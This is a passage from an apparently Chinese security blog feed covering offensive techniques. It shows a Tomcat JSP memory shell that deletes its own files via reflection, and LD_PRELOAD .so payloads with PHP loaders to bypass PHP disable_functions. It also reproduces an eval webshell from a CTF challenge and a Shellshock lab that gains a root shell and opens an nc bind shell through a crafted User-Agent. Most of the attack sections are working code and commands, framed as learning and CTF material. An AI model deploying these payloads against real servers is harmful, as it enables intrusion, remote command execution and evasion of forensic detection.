mappingData.getClass().getDeclaredField(<span class="string">&quot;wrapper&quot;</span>);</span><br><span class="line">    wrapperF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) wrapperF.get(mappingData);</span><br><span class="line">    <span class="comment">//获取jspServlet对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">instanceF</span> <span class="operator">=</span> wrapper.getClass().getDeclaredField(<span class="string">&quot;instance&quot;</span>);</span><br><span class="line">    instanceF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">jspServlet</span> <span class="operator">=</span> (Servlet) instanceF.get(wrapper);</span><br><span class="line">    <span class="comment">//获取rctxt属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">rctxt</span> <span class="operator">=</span> jspServlet.getClass().getDeclaredField(<span class="string">&quot;rctxt&quot;</span>);</span><br><span class="line">    rctxt.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">JspRuntimeContext</span> <span class="variable">jspRuntimeContext</span> <span class="operator">=</span> (JspRuntimeContext) rctxt.get(jspServlet);</span><br><span class="line">    <span class="comment">//获取jsps属性内容</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">jspsF</span> <span class="operator">=</span> jspRuntimeContext.getClass().getDeclaredField(<span class="string">&quot;jsps&quot;</span>);</span><br><span class="line">    jspsF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ConcurrentHashMap</span> <span class="variable">jsps</span> <span class="operator">=</span> (ConcurrentHashMap) jspsF.get(jspRuntimeContext);</span><br><span class="line">    <span class="comment">//获取对应的JspServletWrapper</span></span><br><span class="line">    <span class="type">JspServletWrapper</span> <span class="variable">jsw</span> <span class="operator">=</span> (JspServletWrapper)jsps.get(request.getServletPath());</span><br><span class="line">    <span class="comment">//获取ctxt属性保存的JspCompilationContext对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">ctxt</span> <span class="operator">=</span> jsw.getClass().getDeclaredField(<span class="string">&quot;ctxt&quot;</span>);</span><br><span class="line">    ctxt.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">JspCompilationContext</span> <span class="variable">jspCompContext</span> <span class="operator">=</span> (JspCompilationContext) ctxt.get(jsw);</span><br><span class="line">    File targetFile;</span><br><span class="line">    targetFile = <span class="keyword">new</span> <span class="title class_">File</span>(jspCompContext.getClassFileName());<span class="comment">//删掉jsp的.class</span></span><br><span class="line">    targetFile.delete();</span><br><span class="line">    targetFile = <span class="keyword">new</span> <span class="title class_">File</span>(jspCompContext.getServletJavaFileName());<span class="comment">//删掉jsp的java文件</span></span><br><span class="line">    targetFile.delete();</span><br><span class="line">    <span class="comment">//删除JSP文件</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">__jspName</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getSimpleName().replaceAll(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    String path=application.getRealPath(__jspName);</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">    file.delete();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>



<p><strong>tomcat7和8&#x2F;9的<code>MappingData</code>类包名发生了变化</strong></p>
<div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="code"><pre><span class="line">tomcat7:&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.http.mapper.MappingData&quot;</span> %&gt;</span><br><span class="line">tomcat8/<span class="number">9</span>:&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.mapper.MappingData&quot;</span> %&gt;</span><br></pre></td></tr></table></figure></div>



<p><strong>jsp马源码见项目中我写的： <code>KoishiEvilJSP.jsp</code></strong></p>
<p>该内存马能够成功执行</p>
<h3 id="字节码加载实现"><a href="#字节码加载实现" class="headerlink" title="字节码加载实现"></a>字节码加载实现</h3><p>一般情况下，我们想上传jsp然后访问执行是不现实的&#x3D;。&#x3D;，因为大多数时候不是热加载，而且也不符合我们对无文件shell的预期，于是这里我尝试修改jsp文件为java文件，并通过打字节码的方式，使jsp加载。（我看好像没啥这方面资料，全都是jsp落地，还是这种加载字节码的比较合适）</p>
<p><strong>详情见代码，emm没打通，可能是加载写的poc入口有问题，没加载上？</strong></p>
<p>后面debug调吧，现在挺忙的，我感觉写的代码应该没问题</p>
<h3 id="不足与缺点"><a href="#不足与缺点" class="headerlink" title="不足与缺点"></a><strong>不足与缺点</strong></h3><ul>
<li>由于jsp的servlet处理类一般都是JspServletWrapper类，所以对于这种自己实现JspServletWrapper类的方法很容易就可以被查杀</li>
<li>由于jsp的局限性，在MVC架构的背景下应用场景也不大</li>
</ul>
<h2 id="十三、JNI绕过RASP"><a href="#十三、JNI绕过RASP" class="headerlink" title="十三、JNI绕过RASP"></a>十三、JNI绕过RASP</h2><p>这个后面再看吧。目前这个还用不上</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>php disable_functions绕过</title>
    <url>/2023/01/02/blog_disable_functions%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="LD-PRELOAD-绕过"><a href="#LD-PRELOAD-绕过" class="headerlink" title="LD_PRELOAD 绕过"></a>LD_PRELOAD 绕过</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">putenv() 	未禁</span><br><span class="line">error_log() 或 mail() 任意一个存在（抑或是找到其他的触发方法。在优化payload的情况下，这是不必要的）</span><br><span class="line">mb_send_mail() 上面两个的替代品</span><br></pre></td></tr></table></figure></div>



<p>在UNIX的动态链接库的世界中，LD_PRELOAD是一个有趣的环境变量，它可以影响程序运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。</p>
<h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>假如存在以下程序，简单的通过库函数 strcmp 校验密码是否正确</p>
<p><strong>verifypasswd.c</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"><span class="type">char</span> passwd[] = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage: %s &lt;password&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(passwd, argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Correct Password!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Invalid Password!/n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>strcmp 是一个外部调用函数，我们可以重新编写一个同名函数：</p>
<p><strong>hack.c</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;\n&quot;</span>, s1, s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>把它编译为一个动态共享库：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!shell</span><br><span class="line">$ gcc -o verifypasswd verifypasswd.c</span><br><span class="line">$ gcc -shared -fPIC hack.c -o hack.so</span><br></pre></td></tr></table></figure></div>

<p>通过LD_PRELOAD来设置它能被其他调用它的程序优先加载：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ export LD_PRELOAD=&quot;./hack.so&quot;</span><br></pre></td></tr></table></figure></div>

<p>运行给出的例程：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!shell</span><br><span class="line">$ ./verifypasswd koishi</span><br><span class="line">$ Correct Password!</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230826173159231.png"
                      alt="image-20230826173159231"
                ></p>
<p>我们看到随意输入字符串都会显示密码正确，这说明程序在运行时优先加载了我们自己编写的程序。这也就是说如果程序在运行过程中调用了某个标准的动态链接库的函数，那么我们就有机会通过LD_PRELOAD来设置它优先加载我们自己编写的程序，实现劫持。</p>
<h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><p>对于实际的利用情况下，在 &#x2F;usr&#x2F;sbin 下存在有些系统命令，可以通过以下指令进行查看详细情况，以sendmail为例</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">readelf -Ws /usr/sbin/sendmail</span><br></pre></td></tr></table></figure></div>

<p>在输出的内容中，可以返现其调用了很多标准库函数，从中选取一个合适的库函数即可，其中就包含 geteuid() 。php中 <code>mail()</code> 函数是会触发这个sendmail系统函数的。格式如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span><br></pre></td></tr></table></figure></div>

<p>除此以外，error_log() 也可触发 sendmail </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_log(&quot;&quot;,1,&quot;&quot;,&quot;&quot;);</span><br></pre></td></tr></table></figure></div>

<p>首先先编写而已so文件</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>        </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/readflag &gt;/tmp/yy&quot;</span>);</span><br><span class="line">&#125;   </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>编译so</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared koishi.c -o koishi.so</span><br></pre></td></tr></table></figure></div>

<p>可以将koishi.so上传到服务器的 &#x2F;tmp 下，再上传以下php文件</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/tmp/koishi.so&quot;</span>);	<span class="comment">// 注意这里的目录要有访问权限</span></span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;&quot;</span>,<span class="number">1</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这样通过直接访问或者包含该 php 文件即可达到想要的效果</p>
<h2 id="payload–优化"><a href="#payload–优化" class="headerlink" title="payload–优化"></a>payload–优化</h2><p>改进方法</p>
<p>上面的方法是劫持某一函数，进行重写。这里的局限就是只能找到一个函数进行劫持，有十个函数就要编写十个不同的so文件，很麻烦。当然我们可以调用一个方法来完成通杀。比如编写以下的c文件（很多调用的命令都可触发）。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__((constructor))<span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmd = getenv(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">	unsetenv(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared koishi.c -o koishi.so</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/tmp/koishi.so&quot;</span>);	<span class="comment">// 注意这里的目录要有访问权限</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;CMD=/readflag &gt;&gt; /tmp/answer.txt&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;&quot;</span>,<span class="number">1</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>代码非常简单</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ant&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>直接使用蚁剑连接上去，肯定是无法直接执行命令的，首先上传上面payload中编译好的so文件，然后上传php文件到html下，直接进行访问即可，在&#x2F;var&#x2F;tmp下会出现执行 &#x2F;readflag 的结果内容。</p>
<h1 id="ShellShock-鸡肋，限制太多"><a href="#ShellShock-鸡肋，限制太多" class="headerlink" title="ShellShock(鸡肋，限制太多)"></a>ShellShock(鸡肋，限制太多)</h1><p><strong>需要bash小于等于bash 4.1</strong></p>
<h2 id="Shellshock-Attack"><a href="#Shellshock-Attack" class="headerlink" title="Shellshock Attack"></a>Shellshock Attack</h2><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>如果在一个含有版本号小于等于bash 4.1的linux或者unix系统，才可能会存在该漏洞。</p>
<h3 id="认识环境变量-bash"><a href="#认识环境变量-bash" class="headerlink" title="认识环境变量&amp;&amp;bash"></a>认识环境变量&amp;&amp;bash</h3><p><strong>1.普通shell变量和bash</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[04/12/2018 09:26] seed@ubuntu:~/Seed/shellshock$ koishi=&quot;hacker&quot;</span><br><span class="line">[04/12/2018 09:26] seed@ubuntu:~/Seed/shellshock$ echo $koishi</span><br><span class="line">hacker</span><br><span class="line">[04/12/2018 09:26] seed@ubuntu:~/Seed/shellshock$ bash</span><br><span class="line">[04/12/2018 09:27] seed@ubuntu:~/Seed/shellshock$ echo $koishi</span><br><span class="line"></span><br><span class="line">[04/12/2018 09:27] seed@ubuntu:~/Seed/shellshock$ exit</span><br><span class="line">exit</span><br><span class="line">[04/12/2018 09:27] seed@ubuntu:~/Seed/shellshock$</span><br></pre></td></tr></table></figure></div>

<p>从上述实验中我们得出结论:bash子进程没有继承普通shell变量 koishi.</p>
<p><strong>2.普通环境变量和bash</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[04/12/2018 09:31] seed@ubuntu:~/Seed/shellshock$ echo $koishi</span><br><span class="line">hacker</span><br><span class="line">[04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ export koishi</span><br><span class="line">[04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ bash</span><br><span class="line">[04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ echo $koishi</span><br><span class="line">hacker</span><br><span class="line">[04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ exit</span><br><span class="line">exit</span><br><span class="line">[04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$</span><br></pre></td></tr></table></figure></div>

<p>从上述实验中我们得出结论:bash子进程继承环境变量 koishi.</p>
<p><strong>3.函数shell变量和bash</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[04/12/2018 09:37] seed@ubuntu:~/Seed/shellshock$ koishi() &#123; echo &quot;koishi is a hacker&quot;;&#125;</span><br><span class="line">[04/12/2018 09:37] seed@ubuntu:~/Seed/shellshock$ koishi</span><br><span class="line">koishi is a hacker</span><br><span class="line">[04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$ bash</span><br><span class="line">[04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$ koishi</span><br><span class="line">koishi: command not found</span><br><span class="line">[04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$ exit</span><br><span class="line">exit</span><br><span class="line">[04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$</span><br></pre></td></tr></table></figure></div>

<p>从上述实验中我们得出结论:bash子进程没有继承函数shell变量 koishi.</p>
<p><strong>4.函数环境变量和bash</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[04/12/2018 09:41] seed@ubuntu:~/Seed/shellshock$ koishi</span><br><span class="line">koishi is a hacker</span><br><span class="line">[04/12/2018 09:41] seed@ubuntu:~/Seed/shellshock$ export -f koishi</span><br><span class="line">[04/12/2018 09:41] seed@ubuntu:~/Seed/shellshock$ bash</span><br><span class="line">[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ koishi</span><br><span class="line">koishi is a hacker</span><br><span class="line">[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ exit</span><br><span class="line">exit</span><br><span class="line">[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ env | grep koishi</span><br><span class="line">koishi=hacker</span><br><span class="line">koishi=() &#123;  echo &quot;koishi is a hacker&quot;</span><br><span class="line">[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$</span><br></pre></td></tr></table></figure></div>

<p>从上述实验中我们得出结论:bash子进程继承了函数环境变量 koishi.</p>
<p><strong>5.再探普通环境变量和bash</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ ailx10=&#x27;() &#123;  echo &quot;ailx10 is a hacker&quot;;&#125;&#x27;</span><br><span class="line">[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -nf koishi</span><br><span class="line">[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -n koishi</span><br><span class="line">[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export -f ailx10</span><br><span class="line">bash: export: ailx10: not a function</span><br><span class="line">[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export ailx10</span><br><span class="line">[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ bash</span><br><span class="line">[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ ailx10</span><br><span class="line">ailx10 is a hacker</span><br><span class="line">[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ env | grep ailx10</span><br><span class="line">ailx10=() &#123;  echo &quot;ailx10 is a hacker&quot;</span><br><span class="line">[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ exit</span><br><span class="line">exit</span><br><span class="line">[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ env | grep ailx10</span><br><span class="line">ailx10=() &#123;  echo &quot;ailx10 is a hacker&quot;;&#125;</span><br><span class="line">[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$</span><br></pre></td></tr></table></figure></div>

<p><strong>从上述实验中我们得出结论:bash子进程误把普通环境变量<code>()&#123; :; &#125;</code>当做函数环境变量处理了.</strong></p>
<p><strong>6.<code>() &#123; :;&#125;</code>再探</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[04/12/2018 09:57] seed@ubuntu:~/Seed/shellshock$ ailx10=<span class="string">&#x27;() &#123; :; &#125;;/bin/ls&#x27;</span></span><br><span class="line">[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ <span class="built_in">export</span> ailx10</span><br><span class="line">[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ bash</span><br><span class="line">curl-7.20.0     myls      myls.c      myprog.cgi.1  readme.txt</span><br><span class="line">curl-7.20.0.tar.gz  myls-notroot  myprog.cgi  myprog.cgi.2</span><br><span class="line">[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$</span><br></pre></td></tr></table></figure></div>

<p>从上述实验中我们得出结论:bash子进程处理了<code>/bin/ls</code>.</p>
<ol>
<li>产生新的bash</li>
<li>通过环境变量传递</li>
<li>环境变量以<code>() &#123;&#125;</code>这样的形式.</li>
</ol>
<p><strong>如何用一条语句验证bash漏洞?</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; bash -c &quot;echo this is a test&quot;</span><br><span class="line">vulnerable</span><br><span class="line">this is a test</span><br><span class="line">[04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ </span><br><span class="line">[04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ </span><br><span class="line">[04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; bash -c :</span><br><span class="line">vulnerable</span><br><span class="line">[04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$</span><br></pre></td></tr></table></figure></div>

<p><code>:</code>什么都不做,在这里和true等价</p>
<p><code>env</code>可以创建临时环境变量。</p>
<p><code>bash -c</code>可以运行一个shell命令.</p>
<h3 id="攻击Set-UID程序"><a href="#攻击Set-UID程序" class="headerlink" title="攻击Set-UID程序"></a>攻击Set-UID程序</h3><p>将sh软链接到我们有漏洞的bash:<code>sudo ln -sf /bin/bash /bin/sh</code></p>
<p>看一个简单的c程序,功能等同与shell命令<code>ls</code>:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setuid(geteuid()); <span class="comment">// make real uid = effective uid.</span></span><br><span class="line">    system(<span class="string">&quot;/bin/ls -l&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>编译运行上面的小程序<br>设置Set-UID和不设置Set-UID的运行结果如下:</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">[04/12/2018 10:36] seed@ubuntu:~/Seed/shellshock$ export gu=&#x27;() &#123; :;&#125;;/bin/sh&#x27;</span><br><span class="line">[04/12/2018 10:36] seed@ubuntu:~/Seed/shellshock$ ./myls</span><br><span class="line">sh-4.2#</span><br><span class="line">sh-4.2# whoami</span><br><span class="line">root</span><br><span class="line">sh-4.2# pwd</span><br><span class="line">/home/seed/Seed/shellshock</span><br><span class="line">sh-4.2# ls</span><br><span class="line">curl-7.20.0     myls      myls.c      myprog.cgi.1  readme.txt</span><br><span class="line">curl-7.20.0.tar.gz  myls-notroot  myprog.cgi  myprog.cgi.2</span><br><span class="line">sh-4.2#</span><br><span class="line">sh-4.2#</span><br><span class="line">sh-4.2# exit</span><br><span class="line">exit</span><br><span class="line">[04/12/2018 10:37] seed@ubuntu:~/Seed/shellshock$ ./myls-notroot </span><br><span class="line">sh-4.2$ </span><br><span class="line">sh-4.2$ whoami</span><br><span class="line">seed</span><br><span class="line">sh-4.2$ exit</span><br><span class="line">exit</span><br><span class="line">[04/12/2018 10:38] seed@ubuntu:~/Seed/shellshock$</span><br></pre></td></tr></table></figure></div>

<p>通过实验结果我们可以得出结论:我们获得了一个root shell和一个普通shell.</p>
<h3 id="攻击CGI程序"><a href="#攻击CGI程序" class="headerlink" title="攻击CGI程序"></a>攻击CGI程序</h3><p>1.创建CGI程序<br>创建myprog.cgi,将文件放入<code>/usr/lib/cgi-bin/</code>目录中,设置可执行权限755,</p>
<p>开启apache.通过浏览器访问<code>127.0.0.1/cgi-bin/myprog.cgi</code>试一试.</p>
<p>再试一试<code>curl http://127.0.0.1/cgi-bin/myprog.cgi</code>.</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;Content-type: text/plain&quot;</span><br><span class="line">echo</span><br><span class="line">echo</span><br><span class="line">echo &quot;Hello World&quot;</span><br></pre></td></tr></table></figure></div>

<p>2.获取网站控制权限</p>
<p>虚拟机的IP地址:192.168.59.142&#x2F;24<br>主机的IP地址:192.168.59.1&#x2F;24</p>
<p><strong>触发网站的shellshock:</strong> <code>curl -A &quot;() &#123; :;&#125;;echo; /bin/nc -lp 10086 -c bash&quot; http://192.168.59.142/cgi-bin/myprog.cgi</code></p>
<p><strong>黑客的主机控制了肉鸡:</strong></p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">root@gt:/home/git/Keep-learning/mySeedLab# nc 192.168.59.142 10086</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">pwd</span><br><span class="line">/usr/lib/cgi-bin</span><br><span class="line">ls</span><br><span class="line">my2.cgi</span><br><span class="line">myprog.cgi</span><br><span class="line">php</span><br><span class="line">php5</span><br><span class="line">cat /etc/passwd</span><br><span class="line">...</span><br><span class="line">hacker:x:1002:1003::/home/hacker:/bin/sh</span><br><span class="line">gu:x:1001:1004::/home/gu:/bin/sh</span><br></pre></td></tr></table></figure></div>

<p><strong>注意:</strong><br>1.主机和虚拟机能够互相Ping通<br>2.主机可以通过浏览器访问虚拟机中的网站<br>3.nc使用netcat-traditional替换netcat-openbsd</p>
<p><strong>原理:</strong></p>
<p>Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。</p>
<p>在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会。</p>
<p>HTTP协议的头User-Agent通常是通过环境变量<code>HTTP_USER_AGENT</code>来传递的。</p>
<h2 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h2><p>了解了ShellShock后，我们已经知道，想利用这个点，需要三步：</p>
<ol>
<li><p>产生新的bash</p>
</li>
<li><p>通过环境变量传递</p>
</li>
<li><p>环境变量以() {}这样的形式</p>
</li>
</ol>
<p>这时候第一想法就是老老实实的蚁剑连，然后进终端进行操作。但是权限不够，设置环境变量，启用bash等这些命令都无法执行。可以参考之前的方法利用PHP的putenv函数设置环境变量，这样环境变量就设好了。</p>
<p>现在需要思考如何产生新的 bash</p>
